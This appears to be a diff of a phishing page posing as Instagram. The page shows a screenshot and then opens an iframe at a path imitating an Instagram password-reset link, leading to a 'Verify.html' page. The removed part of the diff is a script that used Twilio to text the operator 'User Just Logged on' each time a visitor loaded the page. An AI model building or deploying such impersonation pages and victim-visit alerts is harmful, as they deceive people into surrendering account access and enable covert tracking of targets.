@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>instagram</title>
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <style>
@@ -40,7 +40,6 @@
             height: auto;
         }
 
-
       /* Mobile-friendly styles */
         @media (max-width: 768px) {
             .container {
@@ -53,51 +52,9 @@
             }
       }
    </style>
-
-   <script>
-      $(document).ready(function () {
-         const twilioAccountSID = 'YOUR_TWILIO_ACCOUNT_SID';
-         const twilioAuthToken = 'YOUR_TWILIO_AUTH_TOKEN';
-         const twilioPhoneNumber = 'YOUR_TWILIO_PHONE_NUMBER';
-         const toPhoneNumber = 'RECIPIENT_PHONE_NUMBER'; // Replace with the actual recipient's phone number
-
-         function sendTwilioSMS() {
-            const twilioApiUrl = `https://api.twilio.com/2010-04-01/Accounts/${twilioAccountSID}/Messages.json`;
-
-            const istTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
-            const formattedTime = `${istTime}`;
-
-            const messageBody = `User Just Logged on\n ‎ ‎ ‎ ‎\n${formattedTime}`;
-
-            const auth = btoa(`${twilioAccountSID}:${twilioAuthToken}`);
-
-            $.ajax({
-               type: 'POST',
-               url: twilioApiUrl,
-               beforeSend: function (xhr) {
-                  xhr.setRequestHeader('Authorization', `Basic ${auth}`);
-               },
-               data: {
-                  To: toPhoneNumber,
-                  From: twilioPhoneNumber,
-                  Body: messageBody
-               },
-               success: function (response) {
-                  console.log('Twilio Notification Sent:', response);
-               },
-               error: function (error) {
-                  console.error('Error sending Twilio Notification:', error);
-               }
-            });
-         }
-
-         sendTwilioSMS();
-      });
-   </script>
-
-   
 </head>
 <body>
+
    <div class="container" id="container">
       <img class="image" src="Screenshot-2023-0925-025553-x4.png" alt="Image 1">
    </div>
@@ -114,44 +71,40 @@
       }, 1600); // Adjust the initial delay as needed
    </script>
 
-   <!-- Your existing code -->
+   <script>
+      // Store a reference to the iframe
+      let myIframe;
 
-<script>
-// Store a reference to the iframe
-let myIframe;
+      // Listen for messages from any iframe
+      window.addEventListener('message', function(event) {
+          if (event.data === 'close') {
+              // Close the iframe when a 'close' message is received
+              if (myIframe) {
+                  myIframe.remove();
+                  console.log('Iframe closed');
+              } else {
+                  console.log('Iframe not found');
+              }
+          }
+      });
 
-// Listen for messages from any iframe
-window.addEventListener('message', function(event) {
-    if (event.data === 'close') {
-        // Close the iframe when a 'close' message is received
-        if (myIframe) {
-            myIframe.remove();
-            console.log('Iframe closed');
-        } else {
-            console.log('Iframe not found');
-        }
-    }
-});
+      function loadIframe() {
+          // Check if the iframe already exists before creating a new one
+          if (!myIframe) {
+              myIframe = document.createElement('iframe');
 
-function loadIframe() {
-    // Check if the iframe already exists before creating a new one
-    if (!myIframe) {
-        myIframe = document.createElement('iframe');
+              // Set iframe attributes
+              myIframe.src = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html'; // Change the URL to your desired destination
+              myIframe.id = 'myiframe';
 
-        // Set iframe attributes
-        myIframe.src = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html'; // Change the URL to your desired destination
-        myIframe.id = 'myiframe';
+              // Log to console indicating that we are inside an iframe
+              console.log('Inside iframe');
 
-        // Log to console indicating that we are inside an iframe
-        console.log('Inside iframe');
-
-        // Append iframe to body
-        document.body.appendChild(myIframe);
-    }
-}
-</script>
-
-<!-- Your existing code -->
+              // Append iframe to body
+              document.body.appendChild(myIframe);
+          }
+      }
+   </script>
 
 </body>
 </html>
